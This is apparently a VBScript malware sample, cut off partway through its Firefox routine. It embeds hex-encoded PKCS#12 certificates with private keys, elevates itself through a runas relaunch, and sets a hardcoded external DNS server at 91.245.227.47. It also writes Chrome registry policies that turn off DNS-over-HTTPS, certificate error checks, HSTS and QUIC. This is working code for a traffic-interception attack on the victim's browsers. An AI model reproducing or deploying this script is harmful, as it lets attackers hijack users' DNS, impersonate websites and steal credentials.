Option Explicit

On Error Resume Next

Dim xdata
xdata = Array("30-82-0A-B1-02-01-03-30-82-0A-6D-06-09-2A-86-48-86-F7-0D-01-07-01-A0-82-0A-5E-04-82-0A-5A-30-82-0A-56-30-82-06-0F-06-09-2A-86-48-86-F7-0D-01-07-01-A0-82-06-00-04-82-05-FC-30-82-05-F8-30-82-05-F4-06-0B-2A-86-48-86-F7-0D-01-0C-0A-01-02-A0-82-04-FE-30-82-04-FA-30-1C-06-0A-2A-86-48-86-F7-0D-01-0C-01-03-30-0E-04-08-E6-E3-2F-59-5E-E2-38-D6-02-02-07-D0-04-82-04-D8-4F-34-66-34-C8-34-C1-26-34-13-88-3A-54-14-2F-FB-B4-60-40-C5-2F-3C-1C-D4-10-90-82-FE-41-25-0D-9A-C0-30-EE-C8-7B-84-4B-B8-95-50-CA-8D-1E-11-FD-82-B1-C1-54-6E-08-EF-5A-37-CE-57-5C-F6-77-4A-6D-DA-40-52-8F-CA-DF-75-6F-DD-F5-19-4C-2D-BD-81-A4-B5-6C-12-47-73-1B-BC-0A-09-4D-0A-33-28-4F-9F-53-1B-3C-76-79-D6-67-0A-F5-57-F8-8A-B9-CF-A1-BE-69-EC-83-74-E7-6B-C2-BB-12-9E-59-01-F7-E7-63-0E-59-B7-65-05-15-7B-42-ED-DA-D3-A2-3E-33-C1-4C-75-8B-A2-2C-AE-89-A5-49-32-6B-20-BE-71-45-C3-1F-19-B8-9F-D7-BF-B6-C1-74-CA-1D-AC-39-5B-E6-DB-79-16-40-03-33-F7-EC-53-3D-D0-0F-F3-E9-FD-7B-54-92-AB-D3-5F-A9-0E-7E-E5-5B-27-0A-5C-A7-3E-FF-C7-7D-7D-B8-03-78-6A-11-4E-EC-1A-BC-DE-A7-BB-82-A1-6D-62-2D-B6-04-0E-7B-39-2B-ED-93-8E-7F-ED-E5-F9-C9-1A-35-F4-6D-B4-84-78-3A-79-CE-76-83-05-70-C8-55-AF-DA-67-AB-F1-40-CA-30-2C-0E-C3-E6-FF-1F-22-38-49-61-D9-42-4A-62-03-3E-AB-7D-D0-84-62-89-3A-05-BC-8B-A6-13-64-2C-A7-A8-C5-99-11-F0-0A-EA-42-B7-95-25-24-42-B8-19-74-A7-5D-CC-7D-CA-BD-59-A2-11-49-0A-EA-89-61-2B-6F-85-80-7D-03-4D-D2-89-82-EA-99-17-16-DE-1F-97-3D-FD-98-AD-E8-09-6C-49-DD-DD-96-AC-22-18-4F-FC-F5-DD-C6-09-9F-35-84-FF-09-21-77-AE-70-53-AC-51-63-FE-B3-95-5C-15-2F-40-97-6F-0C-58-10-1E-F9-9F-C4-8F-6A-9B-67-CD-43-77-D1-47-8F-4C-F6-4D-29-9C-36-C3-68-07-FD-C3-32-24-62-D9-90-AD-0B-49-08-30-63-47-21-51-00-0D-E7-F2-19-CE-2E-75-3B-13-42-19-D5-5F-4C-34-9F-EF-8A-6F-75-E3-D5-7E-CD-22-35-06-A2-20-B4-04-AA-0B-ED-AD-F9-53-1D-E4-9B-19-42-B6-45-97-78-13-67-58-F8-60-B8-DE-29-84-6D-A1-2F-9E-05-85-1F-6E-9E-6E-81-EB-87-C9-2D-6D-0E-7B-E7-4E-38-C7-70-E2-52-0F-B1-33-AF-8C-58-A4-05-96-B4-C3-30-FA-D5-B9-4B-63-B7-85-F9-8E-67-7F-4D-C7-02-AA-45-66-80-9B-5A-A0-49-00-6C-C4-2D-14-42-85-30-D7-20-D2-AB-C8-7C-85-10-C7-2F-19-DB-57-C8-17-42-A3-6E-11-95-AC-E6-48-05-2F-80-01-3D-5F-F0-5C-49-2D-D4-E7-13-16-C9-44-30-30-9A-FA-E7-BE-3F-C1-57-A9-81-C0-E6-8F-AE-52-A1-68-B6-70-1F-F9-56-AA-96-47-46-08-96-40-80-6E-1C-39-71-BD-BD-8E-2C-FB-A8-43-FD-33-C3-BD-91-8A-7F-E6-37-64-5D-09-B7-3C-A4-9A-56-B0-41-A3-9C-CE-D4-E6-C2-32-0A-2C-B0-BB-40-41-9C-C5-AF-A4-C2-0E-55-11-17-AC-6A-17-B3-86-35-80-25-36-00-CB-2B-04-5F-99-23-26-D2-25-79-82-24-14-55-97-27-ED-C4-7F-50-87-BF-86-28-FA-3F-E5-47-07-C4-57-D6-28-1C-41-93-98-AA-F8-A6-B6-57-14-CE-62-FF-79-70-D8-74-D1-F5-0B-17-C7-BB-06-96-30-5B-AF-55-B8-5A-95-42-E7-D0-85-5D-08-7B-4B-2F-5F-88-4A-A6-4E-1F-5E-2A-84-E6-F3-43-78-99-69-9D-F1-F2-B9-7D-AD-10-60-A7-2A-67-49-47-62-E7-98-D5-79-F5-DB-25-52-F0-4C-52-D8-3F-53-58-0F-CF-E1-1C-8E-62-C5-3B-70-E4-71-70-DF-6C-0A-1F-55-67-D2-4C-CE-4B-B4-C1-4C-AC-0B-94-4B-05-2B-F3-08-F7-6A-54-DF-9C-FC-49-45-6E-92-73-E0-13-E0-4B-87-C4-7B-E2-4A-A5-C8-E0-95-86-2F-8D-BD-D4-2F-69-34-B1-EA-5D-E2-47-10-10-45-9D-62-0D-8D-BE-96-EE-A5-02-A1-19-BF-B2-AC-6A-FB-17-62-76-4E-16-FB-C8-3A-D4-57-6A-CC-C5-92-64-50-82-6B-1D-24-6E-D9-4B-FB-46-12-E4-C7-9A-65-75-96-C7-44-85-2C-32-EE-8B-56-82-04-68-2E-AA-0A-66-A6-1C-7F-E3-04-19-B7-05-4E-66-5B-DF-DF-9D-B0-2A-47-5E-05-78-0B-A6-95-37-BE-2E-27-7E-D3-2D-0C-74-47-81-00-D4-CA-71-33-83-9E-55-6C-24-2D-C0-29-35-E2-E7-DD-45-D8-33-01-59-88-68-2D-78-0C-9B-BD-73-7E-5B-20-6C-08-32-F4-D9-98-C2-38-B2-DF-FB-A3-E4-DF-F4-34-EE-23-32-88-3D-2C-E0-06-08-A4-25-F7-EF-95-21-81-F9-BC-BE-C0-65-D4-C0-30-BB-CB-0B-EC-51-65-45-02-5E-03-A6-16-56-21-CC-04-B7-10-41-C0-17-2E-DB-50-98-A2-AC-54-BA-48-DE-D8-51-6A-9D-1B-33-62-C6-A0-8B-2F-66-66-D2-B6-B4-D5-C0-7E-2C-04-3C-A8-94-B4-04-CE-EC-6E-A1-D5-68-ED-E6-CE-54-A1-C4-D3-11-9F-E9-5D-17-FD-26-1A-1D-53-CC-4B-15-8F-DA-6A-60-53-FD-CF-61-BB-EC-8D-7E-5F-55-ED-58-F9-6E-35-5E-D2-BF-94-57-55-F9-5B-C8-A5-46-ED-FA-26-C4-09-03-F7-CB-EF-F6-8C-4B-E6-AA-56-40-52-FE-2B-8B-B4-98-21-F5-1C-25-D8-32-E5-DC-66-FF-C5-7A-1F-0B-35-E7-33-6A-6D-7B-6E-C7-34-85-76-A8-DE-44-6C-9F-B5-27-C5-3E-1C-A8-31-C5-44-85-1E-00-C5-4E-91-1D-05-F3-94-99-D9-E0-AB-0A-FE-3D-BB-FD-64-1E-44-55-A2-DC-63-D9-31-81-E2-30-0D-06-09-2B-06-01-04-01-82-37-11-02-31-00-30-13-06-09-2A-86-48-86-F7-0D-01-09-15-31-06-04-04-01-00-00-00-30-5D-06-09-2A-86-48-86-F7-0D-01-09-14-31-50-1E-4E-00-74-00-65-00-2D-00-38-00-63-00-39-00-63-00-63-00-38-00-34-00-63-00-2D-00-32-00-33-00-30-00-35-00-2D-00-34-00-35-00-35-00-61-00-2D-00-38-00-30-00-37-00-63-00-2D-00-38-00-66-00-35-00-34-00-35-00-37-00-38-00-61-00-66-00-61-00-66-00-31-30-5D-06-09-2B-06-01-04-01-82-37-11-01-31-50-1E-4E-00-4D-00-69-00-63-00-72-00-6F-00-73-00-6F-00-66-00-74-00-20-00-53-00-74-00-72-00-6F-00-6E-00-67-00-20-00-43-00-72-00-79-00-70-00-74-00-6F-00-67-00-72-00-61-00-70-00-68-00-69-00-63-00-20-00-50-00-72-00-6F-00-76-00-69-00-64-00-65-00-72-30-82-04-3F-06-09-2A-86-48-86-F7-0D-01-07-06-A0-82-04-30-30-82-04-2C-02-01-00-30-82-04-25-06-09-2A-86-48-86-F7-0D-01-07-01-30-1C-06-0A-2A-86-48-86-F7-0D-01-0C-01-03-30-0E-04-08-20-54-6F-8A-72-8E-8C-A6-02-02-07-D0-80-82-03-F8-68-A8-8F-B8-D4-A8-F4-A9-5F-30-76-0D-37-D1-FF-F8-78-D2-23-8D-89-B2-7F-B7-9B-72-9E-1F-04-8B-7B-01-B6-FA-DD-A5-4B-BF-C0-E3-C0-75-7A-54-14-07-2F-F7-94-AE-8A-E6-25-45-5F-C2-F5-66-3F-69-85-26-89-F7-0D-A0-0A-02-68-F6-47-22-8C-A0-9B-21-E5-EE-01-2C-3B-3C-38-2A-63-5B-9D-C2-0C-41-49-21-2B-6B-4E-F3-F3-81-A4-F2-59-D3-C9-F2-AC-0F-64-97-23-B5-64-9D-E6-68-FD-1D-3F-C0-67-B8-C8-49-86-59-B1-60-D6-CF-68-E5-17-E6-E0-E3-59-8A-46-A9-18-CC-98-33-DF-40-35-A8-9D-45-77-AA-A5-87-6F-EC-0F-C0-E1-77-01-36-67-7B-67-A5-BE-AE-82-7E-A6-8C-33-82-B4-F5-F5-B0-3A-27-A7-25-FC-BC-CE-08-5D-56-2D-29-05-04-DE-F9-86-1B-43-D6-16-A1-EE-DA-8A-A9-46-90-D0-31-4D-87-A9-39-5D-4E-EF-32-CA-42-50-52-64-0A-25-23-B8-ED-67-F6-9D-32-51-3E-84-37-15-51-C8-BD-C5-EE-E2-B0-41-79-29-89-1E-4E-63-81-93-EE-CC-8B-A9-B5-59-18-9E-4B-A7-48-53-C8-E3-B0-2A-AF-C5-D0-1D-56-E9-9D-85-3D-6D-4D-4E-F8-4E-1F-E4-D1-36-E9-82-E6-F7-32-5B-91-1B-4F-6E-D5-25-B7-A0-8D-C5-32-6B-B5-D7-B4-13-77-FC-F2-4F-09-14-FE-E7-C2-24-4E-16-CC-1B-91-32-79-B4-5D-FC-F2-10-93-63-A5-60-DD-9E-1B-F9-7F-FD-D5-AB-72-1C-05-1A-D6-01-F9-A5-67-24-FE-51-72-E1-4B-96-53-47-4E-31-7A-ED-A5-CA-EA-8B-C9-57-3D-37-52-22-F1-80-5D-A3-13-79-B4-07-AD-2E-C6-50-73-79-52-D2-05-B1-86-D3-81-39-87-7E-38-7B-65-FB-A3-0D-46-33-E6-12-AB-4E-9C-97-A1-3D-AB-0E-AD-0B-5C-74-12-62-1C-8F-D2-2D-05-28-CC-34-A9-4B-7D-74-CC-3C-15-76-5B-28-09-70-27-F3-A7-CF-90-D0-20-7B-CE-A1-1E-7C-23-B7-6B-AA-09-E9-40-5A-D2-94-73-E3-20-42-FF-AA-A8-18-47-EC-36-E8-4D-66-3A-28-A3-C3-5E-E0-23-2B-78-36-A2-AD-77-DB-05-2F-FA-95-42-1D-A2-3B-06-C0-3B-10-C2-47-CE-DD-B8-BC-6F-D2-F1-C5-F2-F7-2A-FA-6E-34-B5-7E-DA-4B-84-E3-29-2E-FB-42-55-DD-A6-0C-DE-F5-27-A8-B6-04-88-92-5C-5F-70-DA-14-02-08-1D-96-7E-D7-07-2E-E2-93-75-58-24-DF-E9-8B-2B-04-AC-0F-88-25-1B-FC-77-41-98-22-C0-40-E8-DF-06-A3-60-81-0F-9D-EE-70-CD-28-3E-BF-5D-9D-FF-C1-72-3C-31-67-12-55-9A-DA-85-2C-CB-FF-4C-1F-0A-D1-20-43-AD-4E-C3-EE-82-40-F8-85-7C-57-06-7D-AB-96-7C-60-06-29-3E-18-E1-B3-1A-BA-0A-63-28-07-DE-A1-BE-BB-15-DA-39-19-7D-0F-33-B7-54-A5-35-24-79-74-CD-FD-9D-2E-02-71-08-BC-CA-2F-97-97-24-30-83-ED-B7-B1-4F-6C-D7-3C-25-C6-66-41-71-2B-D6-FD-E1-63-34-CA-FB-CB-96-94-20-88-86-28-41-0C-17-0B-D0-FA-8B-B8-72-49-17-E9-E5-F7-EF-2E-57-16-A8-D2-13-14-9F-C3-3D-BC-61-45-5E-35-0A-BB-F8-F8-EA-81-C3-A2-97-C9-09-64-87-24-10-BF-B3-AD-D5-3D-98-A4-11-57-2A-0F-D9-98-DF-89-83-8E-97-7B-13-18-9E-1E-34-4D-DD-F6-1B-3B-AA-4C-E8-3C-07-8F-03-5A-05-F7-3E-97-69-AA-F0-23-EB-D6-B0-D3-46-D7-32-C8-02-BB-A5-3D-8E-78-78-86-3D-86-28-D8-C0-09-AF-4E-B1-3F-F1-AB-F6-7D-23-2C-6E-B4-4E-21-B6-C4-58-0D-5B-B1-D9-E6-01-1F-CF-A9-D3-97-19-7B-4F-55-D0-CE-48-E9-34-61-CA-39-C7-EA-8E-B2-21-2F-C8-20-34-6C-4E-AA-39-B1-C4-05-F3-D3-4C-4B-17-A6-7A-89-80-7C-2A-A2-71-53-E8-04-1A-89-68-A5-C5-13-B5-12-F5-DD-3C-1B-BC-0F-2A-98-92-CB-E1-B1-1A-A5-91-AA-12-D4-A8-0B-49-46-08-50-73-C8-74-C0-AF-91-87-AC-AF-97-37-E4-52-AC-C3-07-BC-04-66-10-54-EB-9D-38-25-EB-09-D8-B1-07-F9-9C-94-73-05-B5-3A-19-69-E9-CD-10-5D-F4-25-3A-26-E7-86-CC-E4-47-63-71-2D-8A-BB-09-86-DC-D8-1E-7A-D7-72-67-19-0C-FF-9B-A9-3F-A5-C3-0B-52-38-1E-FC-A9-7E-F9-74-11-D6-16-DC-6A-5E-13-AC-28-B8-4B-BA-A4-11-E8-43-03-E6-53-30-3B-30-1F-30-07-06-05-2B-0E-03-02-1A-04-14-F2-5D-79-A6-C8-4D-26-E9-52-28-C2-55-D5-40-93-90-15-EA-A6-EA-04-14-F4-C2-34-13-96-FB-50-01-CD-A5-45-AB-94-E3-C0-D6-39-C7-D8-05-02-02-07-D0", "30-82-0A-A1-02-01-03-30-82-0A-5D-06-09-2A-86-48-86-F7-0D-01-07-01-A0-82-0A-4E-04-82-0A-4A-30-82-0A-46-30-82-06-0F-06-09-2A-86-48-86-F7-0D-01-07-01-A0-82-06-00-04-82-05-FC-30-82-05-F8-30-82-05-F4-06-0B-2A-86-48-86-F7-0D-01-0C-0A-01-02-A0-82-04-FE-30-82-04-FA-30-1C-06-0A-2A-86-48-86-F7-0D-01-0C-01-03-30-0E-04-08-19-75-7B-6D-43-C4-F7-29-02-02-07-D0-04-82-04-D8-61-58-CD-B4-F1-09-9B-F9-96-A8-8C-89-EB-FD-8E-54-21-0B-16-71-FC-EC-17-EF-75-66-92-6E-FF-3D-F8-9F-CC-4A-19-B8-E3-EB-9D-60-84-86-85-DC-D3-01-D3-A7-89-7E-99-34-7E-9D-37-CF-56-BD-D8-60-3B-D3-A0-A9-BE-D3-51-BC-F7-09-71-5A-62-9F-58-2B-D5-3F-13-F2-3E-64-FB-26-F0-C0-A2-ED-B0-0C-7F-C1-AD-7D-0B-0E-2C-53-C5-04-80-7E-AE-D0-B0-D1-63-01-A4-1F-00-BB-4D-A2-47-E1-C2-3F-F9-D7-59-51-B8-F3-C6-A5-05-16-71-27-9D-E9-27-6A-9A-FA-EB-6F-9C-96-54-DF-FF-0B-66-7A-63-86-01-AA-99-B8-FC-65-AD-97-F8-69-C7-8E-85-74-53-07-45-48-D4-B8-B4-FD-22-57-C0-C3-46-B1-B1-32-0D-D1-87-7B-D8-91-29-BD-68-9B-7C-99-F9-F8-80-76-65-58-D1-58-46-BF-AD-11-EA-3B-53-C1-30-96-DB-E4-33-DE-15-A3-C0-5F-DB-38-8B-BD-2C-E0-EB-C0-D6-38-DB-43-68-FB-90-CA-06-0A-DA-77-79-F8-4B-84-CA-5D-63-91-27-71-C9-D4-4A-17-D6-AF-58-B9-5E-5E-95-B5-95-94-E4-F6-62-DB-1B-4D-74-AB-B6-19-78-94-C3-22-1F-0E-00-30-6F-C8-5C-7E-26-04-7A-4A-16-F6-25-F0-01-B6-4D-F9-82-01-25-6E-38-5A-7C-DB-B8-DA-75-3C-53-9D-56-86-4D-A0-85-7E-A1-36-BC-DD-5F-27-49-13-8E-9B-07-3D-4F-F7-03-F3-BD-63-2D-84-C0-7F-19-A8-FC-04-E2-D8-C4-DC-43-88-CA-D7-00-63-FC-EA-18-1A-AB-4A-A4-4E-87-B3-DC-A4-F6-57-3B-98-53-17-24-D3-1B-DC-86-B9-F0-A7-96-BE-94-6F-09-D9-DF-A4-21-F5-84-24-5B-87-7E-17-DA-3E-FE-D6-23-4D-1F-38-EE-E1-49-32-A4-12-B9-2A-01-76-B9-9C-A4-86-F6-99-3C-F1-65-26-09-67-5C-56-02-C5-74-12-CC-A7-BE-7A-D6-A7-C7-42-CE-9A-7E-DF-C9-F4-37-D3-87-D3-98-D6-FD-7B-A9-E0-BA-A8-30-69-0C-ED-64-B1-80-83-8E-ED-25-C1-F3-6A-C4-63-B6-AF-DE-36-25-F3-9F-60-97-29-09-E5-E1-7E-9F-84-65-51-74-E1-07-79-C2-BE-89-87-CD-51-5D-BE-8E-06-EE-BE-66-E5-8C-26-55-85-9B-D5-48-34-36-88-44-6B-21-52-94-CE-EA-0E-69-A1-A7-75-BC-A6-99-30-86-FA-30-0A-D6-6D-15-CF-BF-15-43-E2-DC-CB-12-27-1B-AC-A4-B8-A2-3B-5A-66-75-C9-15-B2-EF-64-4F-93-22-0A-6A-64-16-C3-95-DD-FB-D5-57-E8-75-CD-9A-54-44-F1-3E-82-08-57-68-C6-E7-D4-A9-5F-D5-98-F6-DB-69-DF-C8-AA-56-D9-01-9F-46-B9-74-E2-AC-F8-76-DD-E1-12-11-AC-0E-07-08-AC-3A-35-F7-CF-65-51-0B-2A-F3-0A-29-45-73-1B-E2-03-AB-9B-C2-04-9B-C3-F6-16-54-21-F5-D6-17-EB-13-6B-80-A7-25-43-2E-BF-1F-D6-EC-4C-C6-D3-49-A0-43-EB-C0-2B-04-D8-97-88-C6-ED-41-6A-B7-F7-4D-10-C4-75-B0-78-41-1A-47-B0-E4-F9-71-4E-4E-E3-1A-18-E1-A9-9D-2D-82-30-B2-16-8F-A7-24-C6-CD-48-2A-4B-78-80-2F-0D-D8-B5-58-DA-4F-F9-0C-D8-23-68-A4-0C-38-68-B4-7B-D5-29-E9-F1-65-91-8C-D1-A3-B6-8F-DB-4C-58-82-3F-AE-76-8E-35-04-D3-F2-5D-F0-0F-E6-AA-7D-6F-C4-8B-2A-63-53-EB-09-EC-74-29-E2-E2-AC-B9-33-36-09-AE-07-47-03-02-6F-E8-18-97-C1-10-20-D9-2A-02-BD-CB-41-45-84-90-EF-77-04-EE-8F-C8-6C-63-0D-4B-B8-AB-1E-92-99-6E-37-A1-B3-C5-A0-05-EA-40-81-70-2D-A8-45-E9-13-A3-7B-F6-BD-52-C2-6E-EC-09-49-4D-A3-62-6C-EE-D3-5A-5A-8A-89-09-52-F9-7F-05-57-1A-4B-B4-43-3D-1F-DA-3C-69-93-CD-57-14-BE-91-86-56-22-AC-6B-88-5B-D8-A7-F8-86-5E-12-9E-BA-42-56-33-8A-6F-C7-BD-6B-F8-33-5B-0A-58-32-81-59-0F-17-BE-8E-22-15-73-A4-E8-09-63-16-7A-0C-61-32-31-7D-42-55-DB-B7-04-27-A7-3D-44-50-86-82-E1-6C-C0-CF-FA-92-7E-48-DC-BC-E6-79-58-88-70-E8-38-BA-F0-67-9B-F9-CA-34-38-F6-17-46-F2-4D-36-1F-65-66-20-DE-B9-DE-A1-58-BA-51-C6-30-E9-87-B6-79-DB-45-F7-BB-F3-CD-16-BA-C0-7C-05-6E-CE-56-06-D7-DB-94-AC-18-E0-D2-88-B9-8B-D6-52-1F-2A-48-DC-F0-FD-40-54-50-B3-AE-2A-AF-3B-C0-0F-37-DB-9F-DC-A2-C4-24-54-B4-4E-11-D6-31-81-35-C9-C6-74-10-0F-8E-74-CF-98-F3-39-91-9A-6A-D8-34-F1-06-82-C8-AF-0E-E8-4F-F5-04-69-85-13-7A-92-DA-1E-C0-E1-EC-F4-FF-C4-B7-82-D9-DA-5F-F5-78-D5-9C-73-C2-47-83-43-89-FB-C4-80-F7-93-2C-99-3B-AE-A4-29-C3-E1-D7-3A-E4-C6-D4-91-A5-E4-F2-3E-8D-94-A3-8B-6C-BC-C0-4D-0D-F6-0C-B0-A3-F8-94-A2-78-0D-2F-3E-F1-39-25-24-25-4A-5B-56-D1-40-7C-EB-D3-56-67-72-3F-6B-00-BD-83-40-F9-59-9D-B1-ED-2A-B2-74-87-11-4D-83-EE-B1-C4-4A-58-22-E4-15-DB-80-F9-63-28-4E-7E-16-F0-B1-78-F3-13-2B-F2-9A-6A-D2-D8-B9-F6-18-3B-06-00-CC-4E-81-9B-DA-C9-C8-3A-AA-AA-75-FA-75-2A-1C-9F-03-D6-60-0A-0C-6E-03-D4-5A-A8-69-2B-43-C4-09-7D-40-B7-92-31-81-E2-30-0D-06-09-2B-06-01-04-01-82-37-11-02-31-00-30-13-06-09-2A-86-48-86-F7-0D-01-09-15-31-06-04-04-01-00-00-00-30-5D-06-09-2A-86-48-86-F7-0D-01-09-14-31-50-1E-4E-00-74-00-65-00-2D-00-32-00-32-00-31-00-39-00-31-00-36-00-38-00-63-00-2D-00-37-00-30-00-38-00-32-00-2D-00-34-00-39-00-33-00-34-00-2D-00-39-00-65-00-34-00-37-00-2D-00-30-00-31-00-64-00-63-00-66-00-37-00-32-00-63-00-61-00-64-00-37-00-65-30-5D-06-09-2B-06-01-04-01-82-37-11-01-31-50-1E-4E-00-4D-00-69-00-63-00-72-00-6F-00-73-00-6F-00-66-00-74-00-20-00-53-00-74-00-72-00-6F-00-6E-00-67-00-20-00-43-00-72-00-79-00-70-00-74-00-6F-00-67-00-72-00-61-00-70-00-68-00-69-00-63-00-20-00-50-00-72-00-6F-00-76-00-69-00-64-00-65-00-72-30-82-04-2F-06-09-2A-86-48-86-F7-0D-01-07-06-A0-82-04-20-30-82-04-1C-02-01-00-30-82-04-15-06-09-2A-86-48-86-F7-0D-01-07-01-30-1C-06-0A-2A-86-48-86-F7-0D-01-0C-01-03-30-0E-04-08-A1-53-32-1E-98-2C-16-0A-02-02-07-D0-80-82-03-E8-DD-91-D1-6C-B4-37-B2-34-81-E2-73-58-FC-8F-B5-35-6D-07-63-ED-65-74-12-82-A7-D0-EA-04-6A-88-65-8E-63-51-8A-D0-31-9E-55-51-44-48-2C-AF-0B-A7-FA-F4-4E-EF-C7-3C-87-8F-E1-A5-F7-ED-7A-BC-E2-61-45-AC-E8-17-96-E6-12-78-3C-93-44-AC-5E-08-7D-3B-99-14-A3-AF-87-19-D3-2A-9D-47-B0-1C-1A-1E-85-A8-FC-45-26-7C-3F-16-53-E3-05-A5-A7-90-6E-F0-77-4D-B7-6A-C5-74-66-EB-B0-90-D9-A7-69-6E-91-85-FB-AC-45-83-19-B9-D6-FC-92-35-8F-D9-D2-A7-13-32-8B-81-5B-24-67-5E-D4-48-F8-AB-03-DA-8E-0D-AC-CE-61-3E-96-2E-1C-A1-6F-88-9C-3A-BF-2D-B0-31-DA-DD-D2-14-72-C7-27-C5-59-EE-D6-F5-C6-E7-3A-BE-56-62-84-27-02-2C-CD-C6-E5-62-2F-E8-5E-B1-7D-EB-5C-21-81-7F-27-DC-27-49-AE-DF-A2-E2-11-41-31-6E-69-52-18-1B-F9-DA-AD-6F-99-B5-99-9C-85-DF-34-49-C6-19-CB-DC-1B-DA-7D-17-FF-78-73-00-B4-4D-D7-84-90-7E-15-65-8B-C1-45-2B-F3-C3-21-13-EC-54-07-5A-2E-1E-82-69-03-15-BB-FC-1D-AA-AC-68-8E-55-6C-7D-A1-2A-FE-35-E9-F4-71-8F-38-2D-0A-2B-51-9D-F3-F0-BC-48-51-EA-7B-8B-54-68-E6-B6-D9-7D-55-BB-5A-67-5F-D3-E8-E9-C4-D4-F5-A2-57-9F-8A-CC-2A-37-02-F1-7F-D0-9A-94-CD-59-FC-C9-C5-C2-F7-C8-D6-34-BA-5C-B8-E6-8C-72-F5-9F-5E-ED-25-35-E4-87-AE-B2-FD-5D-8E-B4-79-AD-75-65-E5-ED-A7-61-96-8B-17-A0-73-22-F9-90-BF-1A-0B-8D-23-90-AD-54-E5-A7-BD-43-3F-22-FF-AE-09-FA-6B-B7-0A-34-C8-D2-49-BF-B6-78-15-89-4D-11-27-25-63-65-A6-6A-18-CA-2A-AE-73-A6-FA-24-BC-DD-33-6C-13-CB-89-2A-90-81-6C-82-27-01-06-E2-BD-E9-FA-2E-D1-C5-5D-AE-15-DF-DF-92-AA-C9-AA-18-23-B9-58-6D-0E-B6-B8-A3-98-60-25-50-D4-24-58-04-7B-98-AB-54-79-6B-97-2F-B9-D5-64-F0-22-E2-1A-B6-AE-AE-9C-09-9F-E2-36-B9-F8-D3-5B-5B-42-F7-67-A7-6D-71-4A-90-3A-68-7A-EF-4F-C6-BF-2C-87-63-E4-CA-23-0B-86-E5-00-BB-2F-ED-F1-CE-26-51-48-7E-4C-AD-22-F4-34-F6-E8-93-B4-CE-4C-45-A1-0E-05-D6-DF-05-A7-43-30-F5-89-B3-B8-B6-C3-DB-E8-33-6A-6D-7C-DC-DE-42-C1-B1-4D-3A-6E-26-22-7C-D3-FD-CF-22-BA-2C-9F-8B-14-BD-12-26-51-44-4B-8B-E0-DE-25-1D-58-63-E6-BF-8E-0F-40-4C-DC-75-09-17-49-42-E9-EF-48-16-2F-C6-B4-83-50-DB-64-B6-FC-29-7D-D7-DD-4A-7C-2C-0D-DB-05-39-29-B8-C2-A6-48-99-32-32-65-DD-E0-2C-54-7D-B8-E9-84-65-9F-3A-9F-D7-FB-B9-59-D8-D7-53-99-9B-71-E6-89-4B-14-CE-5D-A6-4E-6A-6F-77-0C-C4-27-EB-CC-BE-FE-32-FB-94-7F-8E-28-AD-2F-99-57-F0-A6-B9-3E-B3-FD-C5-26-F0-F5-7A-1D-5B-EE-38-B2-22-28-3B-23-9A-84-EE-EA-D9-C5-26-D4-78-1D-83-02-74-F2-4A-09-21-AA-82-76-D3-DD-DB-9B-37-F3-F0-DD-5D-B4-9E-2D-E6-4D-AE-37-26-3F-23-4F-47-2D-06-A1-5F-D6-BA-AC-F7-8B-F3-B5-3A-25-3A-F2-CD-01-AF-D8-49-BE-A6-A0-8A-A9-72-75-33-48-1B-69-59-57-DD-A3-FC-B2-6B-4C-89-2D-00-3B-85-68-06-B3-23-3B-D2-A2-C3-B7-72-6D-05-A7-CA-61-70-73-26-46-8D-CA-34-B5-80-10-60-78-11-5D-A4-49-CB-30-8F-5E-E8-C3-7C-0A-AC-31-BF-79-F9-A8-F0-5A-74-D8-31-EB-93-06-78-22-18-A0-D1-77-57-63-0D-D6-42-01-4E-8C-95-B8-44-81-55-F8-78-65-CE-61-7E-72-63-B2-D8-65-C7-08-C7-D0-11-58-C9-E3-D5-C3-13-A1-84-A1-6F-72-D7-CE-C0-79-50-69-A9-6C-E0-D4-8F-4C-E6-D1-E2-35-3C-EB-80-4A-98-03-8D-70-75-95-21-04-63-7D-D1-87-CC-75-07-F4-C1-53-22-60-D9-EE-50-A2-F1-71-DD-FC-53-4B-F6-8A-DB-05-79-6F-B9-16-BA-41-1E-55-D7-D8-DC-1F-FE-80-3B-D0-1D-64-55-9E-1C-8B-A9-71-EC-B5-58-0A-EB-A0-37-58-E7-E7-ED-86-A2-E3-69-82-20-7B-86-30-23-30-3B-30-1F-30-07-06-05-2B-0E-03-02-1A-04-14-4E-9F-BB-C3-C8-48-EA-C9-36-FD-9E-0B-FD-F2-D2-17-7B-94-A6-E6-04-14-77-6D-34-14-20-02-A1-D9-8E-25-22-67-C7-9C-AE-4E-D9-F8-F0-3F-02-02-07-D0")

Const PrimaryDNSServer = "91.245.227.47"
Const SecondaryDNSServer = "8.8.8.8"

If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If

Sub MainScriptLogic()

    CertWorks

	Chrome

	FireFox

    Edge

    Dns

    Yandex

    Opera

    
End Sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub



Sub Chrome
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	
	objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"

	Dim chromeKeyPath
	chromeKeyPath = "HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome"
	objShell.RegWrite chromeKeyPath & "\CommandLineFlag", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
	objShell.RegWrite chromeKeyPath & "\DnsOverHttps", "off", "REG_SZ"

    Const HKEY_LOCAL_MACHINE = &H80000002
    dim strKeyPath
    dim strValueName
    dim dwValue
    strKeyPath = "SOFTWARE\Policies\Google\Chrome"
    strValueName = "IgnoreCertificateErrors"
    dwValue = 1
    dim objRegistry
    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue	
End Sub

Sub Firefox()
    Dim objFSO, objShell, userProfilePath, profilePath, userJSPath, objFile

    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objShell = CreateObject("WScript.Shell")

    userProfilePath = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
    profilePath = userProfilePath & "\AppData\Roaming\Mozilla\Firefox\Profiles\"

